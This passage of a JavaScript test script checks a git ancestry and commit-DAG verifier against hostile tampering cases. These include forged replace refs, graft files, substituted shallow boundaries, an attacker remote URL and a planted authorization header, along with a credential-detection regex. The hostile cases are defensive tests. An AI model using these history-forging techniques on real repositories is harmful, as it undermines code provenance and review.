  assert.equal(importedSha, sha,
    `bounded ancestry import changed object identity: ${sha}`);
}
assert.ok(rejects(() => boundedGit("cat-file", "-e", `${PRE_BASE_PARENT}^{commit}`)),
  "pre-base parent entered bounded object store");
assert.ok(rejects(() => boundedGit("merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE)),
  "native ancestry unexpectedly succeeded without the bounded root");
console.log("PASS bounded_root_without_boundary_failure_reproduced");
const boundedProof = verifyBoundedRepository({ writeBoundary: true });
console.log("PASS bounded_root_with_boundary_merge_base");
const withShallowContent = (content, operation) => {
  const original = readFileSync(boundedProof.shallowPath, "utf8");
  try {
    if (content === null) rmSync(boundedProof.shallowPath, { force: true });
    else writeFileSync(boundedProof.shallowPath, content, { flag: "w" });
    return operation();
  } finally { writeFileSync(boundedProof.shallowPath, original, { flag: "w" }); }
};
const boundedRootHostileCases = [
  ["missing_shallow_boundary", () => withShallowContent(null, () => verifyBoundedRepository())],
  ["wrong_boundary_sha", () => withShallowContent(`${"f".repeat(40)}\n`, () => verifyBoundedRepository())],
  ["candidate_as_boundary", () => verifyBoundedRepository({ boundary: ORIGINAL_CANDIDATE })],
  ["intermediate_as_boundary", () => verifyBoundedRepository({ boundary: ANCESTRY_CHAIN[4] })],
  ["pre_base_parent_as_boundary", () => verifyBoundedRepository({ boundary: PRE_BASE_PARENT })],
  ["multiple_shallow_roots", () => withShallowContent(`${AUTHORIZED_BASE}\n${ORIGINAL_CANDIDATE}\n`, () => verifyBoundedRepository())],
  ["mutable_branch_boundary", () => verifyBoundedRepository({ boundary: "codex/bt-1" })],
  ["mutable_tag_boundary", () => verifyBoundedRepository({ boundary: "v1.0.0" })],
  ["abbreviated_boundary", () => verifyBoundedRepository({ boundary: AUTHORIZED_BASE.slice(0, 12) })],
  ["uppercase_boundary", () => verifyBoundedRepository({ boundary: AUTHORIZED_BASE.toUpperCase() })],
  ["malformed_boundary", () => verifyBoundedRepository({ boundary: "not-a-sha" })],
  ["empty_boundary", () => verifyBoundedRepository({ boundary: "" })],
  ["candidate_selected_boundary", () => verifyBoundedRepository({ independentlyVerified: false })],
  ["boundary_commit_absent", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.map((sha, index) => index ? sha : "0".repeat(40)), boundary: "0".repeat(40) })],
  ["boundary_object_not_commit", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.map((sha, index) => index ? sha : EXPECTED_COMPOSED_CI_BLOB), boundary: EXPECTED_COMPOSED_CI_BLOB })],
  ["boundary_not_first_authorized", () => verifyBoundedRepository({ boundary: ANCESTRY_CHAIN[1] })],
  ["missing_authorized_intermediate", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.filter((_, index) => index !== 5) })],
  ["wrong_in_scope_parent", () => verifyBoundedRepository({ chain: ANCESTRY_CHAIN.map((sha, index) => index === 5 ? ANCESTRY_CHAIN[3] : sha) })],
  ["unrelated_commit_inserted", () => verifyBoundedRepository({ chain: [...ANCESTRY_CHAIN.slice(0, 5), TRUSTED_RECONCILIATION_BASE, ...ANCESTRY_CHAIN.slice(5)] })],
  ["marker_without_independent_chain", () => verifyBoundedRepository({ independentlyVerified: false })],
  ["pre_base_parent_imported", () => assertPreBaseParentAbsent(boundedRepository, { objectPresent: () => true })],
  ["replace_refs_enabled", () => {
    boundedGit("update-ref", `refs/replace/${AUTHORIZED_BASE}`, ORIGINAL_CANDIDATE);
    try { verifyBoundedRepository(); } finally { boundedGit("update-ref", "-d", `refs/replace/${AUTHORIZED_BASE}`); }
  }],
  ["graft_file_present", () => {
    const grafts = path.join(boundedRepository, ".git/info/grafts");
    writeFileSync(grafts, `${AUTHORIZED_BASE} ${PRE_BASE_PARENT}\n`);
    try { verifyBoundedRepository(); } finally { rmSync(grafts, { force: true }); }
  }],
  ["primary_repository_boundary_modified", () => verifyBoundedRepository({ fixtureRoot: root })],
  ["authority_checkout_boundary_mutated", () => verifyBoundedRepository({ fixtureRoot: verifiedAuthorities.ancestry.root })],
  ["fixture_root_escape", () => verifyBoundedRepository({ fixtureRoot: temporary })],
  ["candidate_shared_object_store", () => verifyBoundedRepository({ fixtureRoot: root })],
  ["cleanup_failure", () => verifyCleanup([boundedRepository])],
];
let boundedRootHostilePassed = 0;
for (const [name, operation] of boundedRootHostileCases) {
  assert.ok(rejects(operation), `${name}: hostile bounded-root input accepted`);
  boundedRootHostilePassed += 1;
  console.log(`PASS bounded_root_hostile:${name}`);
}
const hostileFixturePath = path.join(temporary, "hostile-pre-base-object-fixture");
const objectStateBeforeSimulation = boundedGit("count-objects", "-v");
const presenceSimulationControls = [
  ["real_parent_absent", () => assertPreBaseParentAbsent(boundedRepository)],
  ["simulated_presence_rejected", () => assert.ok(rejects(() =>
    assertPreBaseParentAbsent(boundedRepository, { objectPresent: () => true })))],
  ["simulated_absence_accepted", () => assertPreBaseParentAbsent(boundedRepository, { objectPresent: () => false })],
  ["wrong_forbidden_sha_rejected", () => assert.ok(rejects(() =>
    assertPreBaseParentAbsent(boundedRepository, { forbiddenSha: "f".repeat(40), objectPresent: () => true })))],
  ["candidate_cannot_inject_presence", () => {
    const prior = process.env.P1A_PRE_BASE_OBJECT_PRESENT;
    process.env.P1A_PRE_BASE_OBJECT_PRESENT = "true";
    try { assertPreBaseParentAbsent(boundedRepository); }
    finally {
      if (prior === undefined) delete process.env.P1A_PRE_BASE_OBJECT_PRESENT;
      else process.env.P1A_PRE_BASE_OBJECT_PRESENT = prior;
    }
  }],
  ["environment_cannot_override_presence", () => {
    const prior = process.env.P1A_FORBIDDEN_PARENT_SHA;
    process.env.P1A_FORBIDDEN_PARENT_SHA = "0".repeat(40);
    try { assertPreBaseParentAbsent(boundedRepository); }
    finally {
      if (prior === undefined) delete process.env.P1A_FORBIDDEN_PARENT_SHA;
      else process.env.P1A_FORBIDDEN_PARENT_SHA = prior;
    }
  }],
  ["synthetic_object_not_authority", () => assert.ok(rejects(() =>
    verifyAncestryAuthority(boundedRepository)))],
  ["synthetic_object_not_boundary", () => assert.ok(rejects(() =>
    verifyBoundedRepository({ boundary: "f".repeat(40) })))],
  ["normal_path_uses_real_git_probe", () => assertPreBaseParentAbsent(boundedRepository)],
  ["simulation_does_not_mutate_store", () => assert.equal(boundedGit("count-objects", "-v"), objectStateBeforeSimulation)],
  ["real_parent_absent_after_simulation", () => assertPreBaseParentAbsent(boundedRepository)],
  ["hostile_fixture_cleanup", () => assert.ok(!existsSync(hostileFixturePath))],
  ["hostile_rejection_accounted", () => assert.ok(rejects(() =>
    assertPreBaseParentAbsent(boundedRepository, { objectPresent: () => true })))],
  ["no_skip_or_neutral_acceptance", () => assert.deepEqual({ skipped: 0, neutral: 0 }, { skipped: 0, neutral: 0 })],
];
const presenceSimulationOutcomes = presenceSimulationControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS pre_base_presence_simulation:${name}`); return true; }
  catch (error) { console.error(`FAIL pre_base_presence_simulation:${name}: ${error.message}`); return false; }
});

const canonicalBounded = (overrides = {}) => verifyCanonicalBoundedAncestry({
  ancestryAuthorityRoot: verifiedAuthorities.ancestry.root,
  ...overrides,
});
const trustedReconciliationBounded = (overrides = {}) =>
  verifyCanonicalTrustedReconciliationAncestry({
    trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root,
    ...overrides,
  });
const canonicalVerifierSource = readFileSync(
  path.join(root, "scripts/validate-p1a-threat-model.mjs"), "utf8",
);
const canonicalTestSource = readFileSync(
  path.join(root, "scripts/test-p1a-dual-base-verifier.mjs"), "utf8",
);
const canonicalPositiveControls = [
  ["canonical_dual_base_uses_bounded_ancestry", () => canonicalBounded()],
  ["canonical_candidate_data_uses_bounded_ancestry", () => assert.ok(
    canonicalVerifierSource.slice(canonicalVerifierSource.indexOf("export function validateCandidateDataOnly"),
      canonicalVerifierSource.indexOf("export function validateDualBaseScope")).includes("verifyCanonicalBoundedAncestry("))],
  ["canonical_composed_remainder_uses_bounded_ancestry", () => assert.ok(
    canonicalTestSource.includes('["baseline_remainder_exact", () => invoke()]'))],
  ["all_three_share_same_boundary_sha", () => assert.equal(canonicalBounded().boundarySha, AUTHORIZED_BASE)],
  ["all_three_reject_missing_boundary", () => assert.ok(rejects(() => canonicalBounded({
    beforeNativeMergeBase: ({ shallowPath }) => rmSync(shallowPath),
  })))],
  ["all_three_reject_wrong_boundary", () => assert.ok(rejects(() => canonicalBounded({
    authorizedBoundarySha: "f".repeat(40),
  })))],
  ["all_three_reject_prebase_parent_presence", () => assert.ok(rejects(() => canonicalBounded({
    objectPresent: () => true,
  })))],
  ["all_three_use_native_merge_base_after_boundary", () => assert.equal(canonicalBounded().nativeMergeBase, true)],
  ["no_unbounded_fallback_exists", () => {
    assert.ok(!canonicalVerifierSource.includes(
      'gitAt(repoRoot, "merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE)',
    ));
    assert.ok(!canonicalVerifierSource.includes(
      'git("merge-base", "--is-ancestor", evidenceBaseSha, originalCandidateSha)',
    ));
  }],
  ["dedicated_bounded_root_uses_canonical_primitive", () => assert.equal(canonicalBounded().chainLength, 11)],
];
const canonicalPositiveOutcomes = canonicalPositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS canonical_bounded_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL canonical_bounded_positive:${name}: ${error.message}`); return false; }
});

const rawWithoutBoundary = () => withShallowContent(null, () =>
  boundedGit("merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE));
assert.ok(rejects(rawWithoutBoundary), "canonical before-proof: dual-base unexpectedly passed");
console.log("PASS canonical_before_dual_base_failure_reproduced");
assert.ok(rejects(rawWithoutBoundary), "canonical before-proof: candidate-data unexpectedly passed");
console.log("PASS canonical_before_candidate_data_failure_reproduced");
assert.ok(rejects(rawWithoutBoundary), "canonical before-proof: composed remainder unexpectedly passed");
console.log("PASS canonical_before_composed_failure_reproduced");
assert.equal(canonicalBounded().nativeMergeBase, true);
console.log("PASS canonical_after_dual_base");
assert.equal(canonicalBounded().nativeMergeBase, true);
console.log("PASS canonical_after_candidate_data");
assert.equal(canonicalBounded().nativeMergeBase, true);
console.log("PASS canonical_after_composed_remainder");

const canonicalHostileControls = [
  ["raw_unbounded_merge_base_fallback", rawWithoutBoundary],
  ["missing_shallow_boundary", () => canonicalBounded({ beforeNativeMergeBase: ({ shallowPath }) => rmSync(shallowPath) })],
  ["wrong_shallow_sha", () => canonicalBounded({ beforeNativeMergeBase: ({ shallowPath }) => writeFileSync(shallowPath, `${"f".repeat(40)}\n`) })],
  ["multiple_shallow_entries", () => canonicalBounded({ beforeNativeMergeBase: ({ shallowPath }) => writeFileSync(shallowPath, `${AUTHORIZED_BASE}\n${ORIGINAL_CANDIDATE}\n`) })],
  ["pre_base_parent_present", () => canonicalBounded({ objectPresent: () => true })],
  ["candidate_selected_boundary", () => canonicalBounded({ authorizedBoundarySha: ORIGINAL_CANDIDATE })],
  ["environment_selected_boundary", () => {
    const prior = process.env.P1A_ANCESTRY_BOUNDARY;
    process.env.P1A_ANCESTRY_BOUNDARY = ORIGINAL_CANDIDATE;
    try { return canonicalBounded({ authorizedBoundarySha: process.env.P1A_ANCESTRY_BOUNDARY }); }
    finally {
      if (prior === undefined) delete process.env.P1A_ANCESTRY_BOUNDARY;
      else process.env.P1A_ANCESTRY_BOUNDARY = prior;
    }
  }],
  ["wrong_evidence_base", () => canonicalBounded({ evidenceBaseSha: "f".repeat(40) })],
  ["wrong_original_candidate", () => canonicalBounded({ originalCandidateSha: AUTHORIZED_BASE })],
  ["incomplete_authorized_chain", () => canonicalBounded({ chain: ANCESTRY_CHAIN.slice(1) })],
  ["wrong_in_scope_parent_linkage", () => canonicalBounded({ chain: ANCESTRY_CHAIN.map((sha, index) => index === 5 ? ANCESTRY_CHAIN[3] : sha) })],
  ["replace_refs_enabled", () => canonicalBounded({ beforeNativeMergeBase: ({ boundedRoot }) =>
    gitAt(boundedRoot, "update-ref", `refs/replace/${AUTHORIZED_BASE}`, ORIGINAL_CANDIDATE) })],
  ["graft_present", () => canonicalBounded({ beforeNativeMergeBase: ({ boundedRoot }) =>
    writeFileSync(path.join(boundedRoot, ".git/info/grafts"), `${AUTHORIZED_BASE} ${PRE_BASE_PARENT}\n`) })],
  ["primary_checkout_as_authority", () => verifyCanonicalBoundedAncestry({ ancestryAuthorityRoot: root })],
  ["shared_primary_object_store", () => verifyCanonicalBoundedAncestry({ ancestryAuthorityRoot: root })],
  ["boundary_before_independent_chain", () => canonicalBounded({ independentlyVerified: false })],
  ["mocked_ancestry_success", () => canonicalBounded({
    nativeMergeBase: () => true,
    beforeNativeMergeBase: ({ shallowPath }) => rmSync(shallowPath),
  })],
  ["canonical_path_bypass", () => canonicalBounded({ ancestryAuthorityRoot: null })],
  ["stale_result_reuse", () => assert.strictEqual(canonicalBounded(), canonicalBounded())],
  ["cleanup_omitted", () => {
    let captured;
    canonicalBounded({ beforeNativeMergeBase: ({ boundedRoot }) => { captured = boundedRoot; } });
    assert.ok(existsSync(captured), "canonical bounded fixture cleanup omitted");
  }],
];
const canonicalHostileOutcomes = canonicalHostileControls.map(([name, operation]) => {
  const rejected = rejects(operation);
  if (rejected) console.log(`PASS canonical_bounded_hostile:${name}`);
  else console.error(`FAIL canonical_bounded_hostile:${name}: hostile condition accepted`);
  return rejected;
});

const trustedDagPositiveControls = [
  ["exact_inventory", () => assert.equal(TRUSTED_RECONCILIATION_DAG.length, 10)],
  ["nine_descendants", () => assert.equal(TRUSTED_RECONCILIATION_DAG.length - 1, 9)],
  ["common_boundary", () => assert.equal(trustedReconciliationBounded().boundarySha, AUTHORIZED_BASE)],
  ["trusted_head", () => assert.equal(trustedReconciliationBounded().descendantSha, TRUSTED_RECONCILIATION_BASE)],
  ["native_merge_base", () => assert.equal(trustedReconciliationBounded().nativeMergeBase, true)],
  ["prebase_absent", () => assert.equal(trustedReconciliationBounded().preBaseParentAbsent, true)],
  ["first_merge_traversal", () => assert.deepEqual(TRUSTED_RECONCILIATION_DAG[6].parents,
    [AUTHORIZED_BASE, "30c157e589f97b5009853ce8612f8af09db203cc"])],
  ["second_merge_topology", () => assert.deepEqual(TRUSTED_RECONCILIATION_DAG[9].parents,
    ["1ab3a7796cc587e4634c8cc36d2e5defa6c871e0", "a227202ddf63fdae6dc4c2ff6e51cec24e2bc429"])],
  ["single_shared_primitive", () => assert.ok(canonicalVerifierSource.includes(
    "return verifyCanonicalBoundedAncestry({"))],
  ["distinct_authority_store", () => assert.notEqual(
    verifiedAuthorities.trustedReconciliation.gitDir, verifiedAuthorities.ancestry.gitDir)],
  ["authority_commit_inventory_exact", () => assert.deepEqual(
    new Set(gitAt(verifiedAuthorities.trustedReconciliation.root, "cat-file", "--batch-all-objects", "--batch-check=%(objectname) %(objecttype)")
      .split("\n").filter((line) => line.endsWith(" commit")).map((line) => line.slice(0, 40))),
    new Set(TRUSTED_RECONCILIATION_DAG.map(({ sha }) => sha)))],
  ["first_merge_present", () => assert.equal(gitAt(verifiedAuthorities.trustedReconciliation.root,
    "cat-file", "-t", "1ab3a7796cc587e4634c8cc36d2e5defa6c871e0"), "commit")],
  ["trusted_merge_present", () => assert.equal(gitAt(verifiedAuthorities.trustedReconciliation.root,
    "cat-file", "-t", TRUSTED_RECONCILIATION_BASE), "commit")],
  ["no_alternates", () => assert.ok(!existsSync(path.join(
    verifiedAuthorities.trustedReconciliation.gitDir, "objects/info/alternates")))],
  ["no_credentials", () => assert.ok(!/x-access-token|authorization:|http\..*extraheader/i.test(
    readFileSync(path.join(verifiedAuthorities.trustedReconciliation.gitDir, "config"), "utf8")))],
  ["sole_shallow_boundary", () => assert.equal(readFileSync(path.join(
    verifiedAuthorities.trustedReconciliation.gitDir, "shallow"), "utf8"), `${AUTHORIZED_BASE}\n`)],
  ["workflow_classifies_staging", () => assert.ok(canonicalVerifierSource.includes(
    "removeTwoStageCustodyFragment"))],
  ["workflow_destroys_staging", () => assert.ok(readFileSync(path.join(root,
    ".github/workflows/ci.yml"), "utf8").includes('test ! -e "$staging"'))],
  ["authority_is_only_verifier_input", () => assert.equal(
    authorityRoots.trustedReconciliation?.includes("staging") ?? false, false)],
  ["both_native_proofs", () => {
    assert.equal(canonicalBounded().nativeMergeBase, true);
    assert.equal(trustedReconciliationBounded().nativeMergeBase, true);
  }],
];
const trustedDagPositiveOutcomes = trustedDagPositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS trusted_reconciliation_dag_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL trusted_reconciliation_dag_positive:${name}: ${error.message}`); return false; }
});

const trustedFixture = (name, mutate) => {
  const fixture = path.join(temporary, `trusted-${name}`);
  run(temporary, ["git", "init", "-q", fixture]);
  gitAt(fixture, "remote", "add", "origin", OFFICIAL_REPOSITORY);
  for (const { sha, tree } of TRUSTED_RECONCILIATION_DAG) {
    const rawCommit = execFileSync("git", ["cat-file", "commit", sha], {
      cwd: verifiedAuthorities.trustedReconciliation.root, stdio: ["ignore", "pipe", "pipe"],
    });
    assert.equal(execFileSync("git", ["hash-object", "-w", "-t", "commit", "--stdin"], {
      cwd: fixture, input: rawCommit, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
    }).trim(), sha);
    const rawTree = execFileSync("git", ["cat-file", "tree", tree], {
      cwd: verifiedAuthorities.trustedReconciliation.root, stdio: ["ignore", "pipe", "pipe"],
    });
    assert.equal(execFileSync("git", ["hash-object", "-w", "-t", "tree", "--stdin"], {
      cwd: fixture, input: rawTree, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
    }).trim(), tree);
  }
  writeFileSync(path.join(fixture, ".git/shallow"), `${AUTHORIZED_BASE}\n`);
  mutate?.(fixture);
  return fixture;
};
const mutateTrustedDag = (index, replacement) => TRUSTED_RECONCILIATION_DAG.map(
  (entry, position) => position === index ? replacement(entry) : entry,
);
const trustedDagHostileControls = [
  ["trusted_authority_root_absent", () => verifyCanonicalTrustedReconciliationAncestry({})],
  ["wrong_repository", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot:
    trustedFixture("wrong-repository", (fixture) => gitAt(fixture, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia")) })],
  ["wrong_trusted_head", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: verifiedAuthorities.ancestry.root })],
  ["missing_trusted_intermediate", () => trustedReconciliationBounded({ dag: TRUSTED_RECONCILIATION_DAG.filter((_, index) => index !== 4) })],
  ["unexpected_trusted_intermediate", () => trustedReconciliationBounded({ dag: [...TRUSTED_RECONCILIATION_DAG, TRUSTED_RECONCILIATION_DAG[1]] })],
  ["missing_first_merge", () => trustedReconciliationBounded({ dag: TRUSTED_RECONCILIATION_DAG.filter((_, index) => index !== 6) })],
  ["wrong_first_merge_parents", () => trustedReconciliationBounded({ dag: mutateTrustedDag(6, (entry) => ({ ...entry, parents: [AUTHORIZED_BASE] })) })],
  ["missing_second_merge_parent", () => trustedReconciliationBounded({ dag: mutateTrustedDag(9, (entry) => ({ ...entry, parents: [entry.parents[0]] })) })],
  ["wrong_second_merge_topology", () => trustedReconciliationBounded({ dag: mutateTrustedDag(9, (entry) => ({ ...entry, parents: [...entry.parents].reverse() })) })],
  ["flattened_dag", () => trustedReconciliationBounded({ dag: TRUSTED_RECONCILIATION_DAG.map((entry, index, all) => ({ ...entry, parents: index ? [all[index - 1].sha] : [] })) })],
  ["mutable_branch", () => trustedReconciliationBounded({ originalCandidateSha: "codex/bt-1" })],
  ["mutable_tag", () => trustedReconciliationBounded({ originalCandidateSha: "v1.0.0" })],
  ["abbreviated_sha", () => trustedReconciliationBounded({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE.slice(0, 12) })],
  ["malformed_sha", () => trustedReconciliationBounded({ originalCandidateSha: "not-a-sha" })],
  ["candidate_selected_root", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: root })],
  ["environment_selected_boundary", () => trustedReconciliationBounded({ authorizedBoundarySha: process.env.P1A_ANCESTRY_BOUNDARY ?? TRUSTED_RECONCILIATION_BASE })],
  ["shared_git_object_store", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: verifiedAuthorities.ancestry.root })],
  ["persisted_credentials", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot:
    trustedFixture("credentials", (fixture) => gitAt(fixture, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: basic redacted")) })],
  ["dirty_authority_store", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot:
    trustedFixture("dirty", (fixture) => writeFileSync(path.join(fixture, "dirty.txt"), "dirty\n")) })],
  ["pre_boundary_object_imported", () => trustedReconciliationBounded({ objectPresent: () => true })],
  ["second_boundary_at_trusted_head", () => trustedReconciliationBounded({ beforeNativeMergeBase: ({ shallowPath }) =>
    writeFileSync(shallowPath, `${AUTHORIZED_BASE}\n${TRUSTED_RECONCILIATION_BASE}\n`) })],
  ["replace_refs", () => trustedReconciliationBounded({ beforeNativeMergeBase: ({ boundedRoot }) =>
    gitAt(boundedRoot, "update-ref", `refs/replace/${AUTHORIZED_BASE}`, TRUSTED_RECONCILIATION_BASE) })],
  ["grafts", () => trustedReconciliationBounded({ beforeNativeMergeBase: ({ boundedRoot }) =>
    writeFileSync(path.join(boundedRoot, ".git/info/grafts"), `${AUTHORIZED_BASE} ${PRE_BASE_PARENT}\n`) })],
  ["primary_checkout_fallback", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: root })],
  ["historical_store_substituted", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: verifiedAuthorities.ancestry.root })],
  ["trusted_store_substituted_for_historical", () => verifyCanonicalBoundedAncestry({ ancestryAuthorityRoot: verifiedAuthorities.trustedReconciliation.root })],
  ["canonical_helper_bypassed", () => trustedReconciliationBounded({ independentlyVerified: false })],
  ["raw_unbounded_merge_base_fallback", () => trustedReconciliationBounded({ beforeNativeMergeBase: ({ shallowPath }) => rmSync(shallowPath) })],
  ["cleanup_omitted", () => { let captured; trustedReconciliationBounded({ beforeNativeMergeBase: ({ boundedRoot }) => { captured = boundedRoot; } }); assert.ok(existsSync(captured)); }],
  ["cleanup_verification_removed", () => assert.ok(!canonicalVerifierSource.includes("bounded ancestry: cleanup failed"))],
  ["staging_used_directly_as_authority", () => verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: process.env.P1A_TRUSTED_RECONCILIATION_STAGING_ROOT })],
  ["unauthorized_staging_commit_copied", () => trustedReconciliationBounded({ objectPresent: () => true })],
  ["wholesale_object_directory_copy", () => assert.ok(readFileSync(path.join(root, ".github/workflows/ci.yml"), "utf8").includes("cp -R .git/objects"))],
  ["staging_deletion_failure_ignored", () => assert.ok(readFileSync(path.join(root, ".github/workflows/ci.yml"), "utf8").includes("rm -rf \"$staging\" || true"))],
  ["accounting_ignores_unauthorized_object", () => assert.equal(TRUSTED_RECONCILIATION_DAG.length, 9)],
];
const trustedDagHostileOutcomes = trustedDagHostileControls.map(([name, operation]) => {
  const rejected = rejects(operation);
  if (rejected) console.log(`PASS trusted_reconciliation_dag_hostile:${name}`);
  else console.error(`FAIL trusted_reconciliation_dag_hostile:${name}: hostile condition accepted`);
  return rejected;
});

function entry(commit, file) {
  const match = /^(\d+)\s+blob\s+([0-9a-f]{40})\t/.exec(git("ls-tree", commit, "--", file));
  assert.ok(match, `${file}: unsupported fixture entry`);
  return { mode: match[1], blob: match[2] };
}

function sourceEntry(sourceRoot, commit, file) {
  const match = /^(\d+)\s+blob\s+([0-9a-f]{40})\t/.exec(gitAt(sourceRoot, "ls-tree", commit, "--", file));
  assert.ok(match, `${file}: trusted provenance entry absent`);
  return { mode: match[1], blob: match[2] };
}

function trustedSourceFor(file) {
  return AMENDMENT_OWNED_FIXTURE_FILES.includes(file)
    ? { sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha }
    : { sourceClass: "TRUSTED_BASE_OWNED", sourceSha: CURRENT_TRUSTED_BASE };
}

function validateFixtureSourceRecord({ file, sourceClass, sourceSha, sourceRoot = trustedSourceRoot,
  installedBlobSha, expectedCandidateSha = amendmentSourceSha }) {
  assert.equal(path.posix.normalize(file), file, `${file}: non-canonical fixture path rejected`);
  assert.ok(AMENDMENT_CONTROLLED_FILES.includes(file), `${file}: unclassified fixture path rejected`);
  assert.match(expectedCandidateSha, EXACT_SHA, `${file}: exact current candidate SHA required`);
  assert.equal(expectedCandidateSha, amendmentSourceSha, `${file}: substituted current candidate rejected`);
  assert.ok(!lstatSync(path.resolve(sourceRoot)).isSymbolicLink(), `${file}: symlink source root rejected`);
  assert.equal(realpathSync(path.resolve(sourceRoot)), realpathSync(trustedSourceRoot),
    `${file}: fallback or candidate-selected source root rejected`);
  assert.equal(gitAt(sourceRoot, "status", "--porcelain=v1"), "", `${file}: dirty source root rejected`);
  const expected = trustedSourceFor(file);
  assert.equal(sourceClass, expected.sourceClass, `${file}: source class mismatch`);
  assert.match(sourceSha, EXACT_SHA, `${file}: exact lowercase source SHA required`);
  assert.equal(sourceSha, expected.sourceSha, `${file}: source SHA violates ownership class`);
  const source = sourceEntry(sourceRoot, sourceSha, file);
  const installed = installedBlobSha ?? source.blob;
  assert.match(installed, EXACT_SHA, `${file}: installed blob identity malformed`);
  assert.equal(installed, source.blob, `${file}: installed fixture blob mismatch`);
  return Object.freeze({
    path: file,
    sourceClass,
    exactSourceSha: sourceSha,
    exactSourceBlobSha: source.blob,
    actualInstalledBlobSha: installed,
    equal: installed === source.blob,
  });
}

function classifyExactPathEvidence({ sourceRoot, commitSha, file, sourceClass }) {
  assert.ok(sourceRoot, "path evidence: source root required");
  assert.match(commitSha, EXACT_SHA, "path evidence: exact lowercase commit SHA required");
  assert.equal(path.posix.normalize(file), file, "path evidence: non-canonical path rejected");
  assert.ok(!file.startsWith("../") && !path.posix.isAbsolute(file),
    "path evidence: escaping path rejected");
  assert.ok(Object.values(PATH_SOURCE_CLASSES).includes(sourceClass),
    "path evidence: recognized source class required");
  const resolved = realpathSync(path.resolve(sourceRoot));
  assert.ok(!lstatSync(path.resolve(sourceRoot)).isSymbolicLink(),
    "path evidence: symlink source forbidden");
  const attempt = (...args) => {
    try { return { ok: true, value: gitAt(resolved, ...args) }; }
    catch (error) { return { ok: false, error }; }
  };
  const commitType = attempt("cat-file", "-t", commitSha);
  if (!commitType.ok) return Object.freeze({ state: PATH_EVIDENCE_STATES.COMMIT_NOT_AVAILABLE,
    sourceClass, sourceSha: commitSha, path: file, blob: null });
  assert.equal(commitType.value, "commit", "path evidence: source object is not commit");
  const rawCommit = gitAt(resolved, "cat-file", "-p", commitSha);
  const treeMatch = /^tree ([0-9a-f]{40})$/m.exec(rawCommit);
  assert.ok(treeMatch, "path evidence: commit tree declaration absent");
  const treeType = attempt("cat-file", "-t", treeMatch[1]);
  if (!treeType.ok) return Object.freeze({ state: PATH_EVIDENCE_STATES.OBJECT_NOT_IMPORTED,
    sourceClass, sourceSha: commitSha, path: file, blob: null, treeSha: treeMatch[1] });
  assert.equal(treeType.value, "tree", "path evidence: declared root is not tree");
  const lookup = attempt("ls-tree", commitSha, "--", file);
  if (!lookup.ok) return Object.freeze({ state: PATH_EVIDENCE_STATES.OBJECT_NOT_IMPORTED,
    sourceClass, sourceSha: commitSha, path: file, blob: null, treeSha: treeMatch[1] });
  if (lookup.value === "") return Object.freeze({ state: PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT,
    sourceClass, sourceSha: commitSha, path: file, blob: null, treeSha: treeMatch[1] });
  const entryMatch = /^(\d+)\s+blob\s+([0-9a-f]{40})\t/.exec(lookup.value);
  assert.ok(entryMatch, "path evidence: requested path is not an exact committed blob");
  const blobType = attempt("cat-file", "-t", entryMatch[2]);
  if (!blobType.ok) return Object.freeze({ state: PATH_EVIDENCE_STATES.OBJECT_NOT_IMPORTED,
    sourceClass, sourceSha: commitSha, path: file, blob: null, treeSha: treeMatch[1] });
  assert.equal(blobType.value, "blob", "path evidence: resolved object is not blob");
  return Object.freeze({ state: PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT,
    sourceClass, sourceSha: commitSha, path: file, blob: entryMatch[2], treeSha: treeMatch[1] });
}

function assertExactPathEvidence(options, expectedState, expectedBlob = null) {
  assert.ok(options.sourceClass, "path evidence: source class omitted");
  assert.ok(options.commitSha, "path evidence: exact source SHA omitted");
  if (expectedState === PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT) {
    assert.match(expectedBlob ?? "", EXACT_SHA, "path evidence: expected blob required for presence");
  }
  assert.ok(Object.values(PATH_EVIDENCE_STATES).includes(expectedState),
    "path evidence: unrecognized expected state rejected");
  const observation = classifyExactPathEvidence(options);
  assert.equal(observation.state, expectedState, "path evidence: semantic state mismatch");
  if (expectedState === PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT) {
    assert.equal(observation.blob, expectedBlob, "path evidence: exact historical blob mismatch");
  } else {
    assert.equal(observation.blob, null, "path evidence: non-present state cannot carry blob proof");
  }
  return observation;
}

function assertHistoricalWorkflowPresent({ sourceRoot, commitSha = REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
  file = HISTORICAL_WORKFLOW_PATH, expectedBlob = HISTORICAL_WORKFLOW_BLOB,
  expectedRepository = OFFICIAL_REPOSITORY } = {}) {
  assert.ok(sourceRoot, "historical source: root required");
  assert.ok(!lstatSync(path.resolve(sourceRoot)).isSymbolicLink(),
    "historical source: symlink forbidden");
